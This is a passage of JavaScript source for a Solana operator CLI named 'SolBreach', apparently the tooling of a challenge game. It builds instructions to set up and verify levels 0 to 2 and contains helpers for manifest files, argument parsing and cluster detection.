      { pubkey: bank, isSigner: false, isWritable: true },
      { pubkey: expectedMint, isSigner: false, isWritable: false },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.from(DISCRIMINATORS.initBank),
  });
}

function buildInitUserStatsInstruction(user, userStats) {
  return new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: user, isSigner: true, isWritable: true },
      { pubkey: userStats, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.from(DISCRIMINATORS.initUserStats),
  });
}

function buildInitLevel0Instruction(user, userStats, level0State) {
  return new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: user, isSigner: true, isWritable: true },
      { pubkey: userStats, isSigner: false, isWritable: true },
      { pubkey: level0State, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.from(DISCRIMINATORS.initLevel0),
  });
}

function buildVerifyAndCloseLevel0Instruction(user, userStats, level0State) {
  return new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: user, isSigner: true, isWritable: true },
      { pubkey: userStats, isSigner: false, isWritable: true },
      { pubkey: level0State, isSigner: false, isWritable: true },
    ],
    data: Buffer.from(DISCRIMINATORS.verifyAndCloseLevel0),
  });
}

function buildInitLevel1Instruction(user, userStats, level1State) {
  return new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: user, isSigner: true, isWritable: true },
      { pubkey: userStats, isSigner: false, isWritable: true },
      { pubkey: level1State, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.from(DISCRIMINATORS.initLevel1),
  });
}

function buildDepositTokensInstruction(
  user,
  bank,
  level1State,
  vault,
  userTokenAccount,
  amount
) {
  const data = Buffer.alloc(16);
  Buffer.from(DISCRIMINATORS.depositTokens).copy(data, 0);
  data.writeBigUInt64LE(amount, 8);

  return new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: user, isSigner: true, isWritable: true },
      { pubkey: bank, isSigner: false, isWritable: false },
      { pubkey: level1State, isSigner: false, isWritable: true },
      { pubkey: vault, isSigner: false, isWritable: true },
      { pubkey: userTokenAccount, isSigner: false, isWritable: true },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
    ],
    data,
  });
}

function buildVerifyAndCloseLevel1Instruction(user, userStats, level1State) {
  return new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: user, isSigner: true, isWritable: true },
      { pubkey: userStats, isSigner: false, isWritable: true },
      { pubkey: level1State, isSigner: false, isWritable: true },
    ],
    data: Buffer.from(DISCRIMINATORS.verifyAndCloseLevel1),
  });
}

function buildInitGlobalProfileInstruction(admin, profile, initialCommander) {
  const data = Buffer.concat([
    Buffer.from(DISCRIMINATORS.initGlobalProfile),
    initialCommander.toBuffer(),
  ]);

  return new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: admin, isSigner: true, isWritable: true },
      { pubkey: profile, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data,
  });
}

function buildInitLevel2Instruction(user, userStats, level2State) {
  return new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: user, isSigner: true, isWritable: true },
      { pubkey: userStats, isSigner: false, isWritable: true },
      { pubkey: level2State, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.from(DISCRIMINATORS.initLevel2),
  });
}

function buildUpdateProfileInstruction(user, profile) {
  return new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: user, isSigner: true, isWritable: true },
      { pubkey: profile, isSigner: false, isWritable: true },
    ],
    data: Buffer.from(DISCRIMINATORS.updateProfile),
  });
}

function buildVerifyAndCloseLevel2Instruction(
  user,
  userStats,
  level2State,
  profile
) {
  return new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: user, isSigner: true, isWritable: true },
      { pubkey: userStats, isSigner: false, isWritable: true },
      { pubkey: level2State, isSigner: false, isWritable: true },
      { pubkey: profile, isSigner: false, isWritable: false },
    ],
    data: Buffer.from(DISCRIMINATORS.verifyAndCloseLevel2),
  });
}

async function sendInstructions(connection, payer, instructions) {
  const transaction = new Transaction().add(...instructions);
  return await sendAndConfirmTransaction(connection, transaction, [payer], {
    commitment: "confirmed",
  });
}

function resolveManifestPath(context, level) {
  if (context.options.manifestPath) {
    return path.resolve(process.cwd(), context.options.manifestPath);
  }

  return path.join(
    context.manifestsDir,
    `${context.cluster}-${context.payer.publicKey.toBase58()}-${level}.json`
  );
}

function saveManifest(filePath, manifest) {
  fs.mkdirSync(path.dirname(filePath), { recursive: true });
  fs.writeFileSync(filePath, `${JSON.stringify(manifest, null, 2)}\n`);
}

function loadManifest(filePath, expectedKind) {
  if (!fs.existsSync(filePath)) {
    throw new Error(
      `Manifest not found at ${filePath}. Run \`${expectedKind} setup\` first or pass --manifest.`
    );
  }

  const manifest = JSON.parse(fs.readFileSync(filePath, "utf8"));
  if (manifest.kind !== expectedKind) {
    throw new Error(
      `Manifest at ${filePath} is for ${manifest.kind}, not ${expectedKind}.`
    );
  }
  return manifest;
}

function tryLoadManifest(filePath) {
  if (!fs.existsSync(filePath)) return null;
  return JSON.parse(fs.readFileSync(filePath, "utf8"));
}

function expandTilde(filePath) {
  if (!filePath?.startsWith("~")) return filePath;
  return path.join(os.homedir(), filePath.slice(1));
}

function parsePublicKey(value, label) {
  try {
    return new PublicKey(value);
  } catch {
    throw new Error(`${label} is not a valid Solana public key.`);
  }
}

function parseBigInt(value, label) {
  try {
    if (!/^\d+$/.test(value)) {
      throw new Error();
    }
    return BigInt(value);
  } catch {
    throw new Error(`${label} must be a positive whole number.`);
  }
}

function detectCluster(rpcUrl) {
  const lowered = rpcUrl.toLowerCase();
  if (
    lowered.includes("localhost") ||
    lowered.includes("127.0.0.1") ||
    lowered.includes("0.0.0.0")
  ) {
    return "localnet";
  }
  if (lowered.includes("devnet")) return "devnet";
  if (lowered.includes("testnet")) return "testnet";
  if (lowered.includes("mainnet")) return "mainnet";
  return "custom";
}

function printBanner(context, level, action) {
  console.log("");
  console.log("SolBreach operator CLI");
  console.log(`  Cluster:   ${context.cluster}`);
  console.log(`  RPC:       ${context.rpcUrl}`);
  console.log(`  Operator:  ${context.payer.publicKey.toBase58()}`);
  console.log(`  Task:      ${level} ${action}`);
}

function formatError(error) {
  if (error instanceof Error) return error.message;
  return String(error);
}
